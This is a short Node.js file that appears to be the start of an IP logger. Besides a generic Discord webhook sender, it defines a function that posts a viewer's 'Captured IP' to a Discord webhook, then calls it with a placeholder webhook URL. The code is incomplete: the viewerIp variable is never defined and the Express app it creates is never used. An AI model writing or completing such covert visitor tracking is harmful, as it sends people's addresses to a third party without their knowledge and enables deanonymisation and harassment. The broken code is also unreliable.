const express = require('express');
const app = express();

async function sendToDiscord(webhookUrl, content) {
    const response = await fetch(webhookUrl, {
        method: "POST",
        headers: {
            "Content-Type": "application/json"
        },
        body: JSON.stringify({
            content: content
        })
    });

    if (!response.ok) {
        throw new Error(`Discord webhook failed: ${response.status}`);
    }

    console.log("Message sent to Discord.");
}



async function sendCapturedIp(webhookUrl, viewerIp) {
    const response = await fetch(webhookUrl, {
        method: "POST",
        headers: {
            "Content-Type": "application/json"
        },
        body: JSON.stringify({
            content: `Captured IP: ${viewerIp}`
        })
    });

    if (!response.ok) {
        throw new Error(`Webhook request failed: ${response.status}`);
    }
}


sendCapturedIp(
    "https://discord.com/api/webhooks/YOUR_WEBHOOK_ID/YOUR_WEBHOOK_TOKEN",
    viewerIp
).catch(console.error);
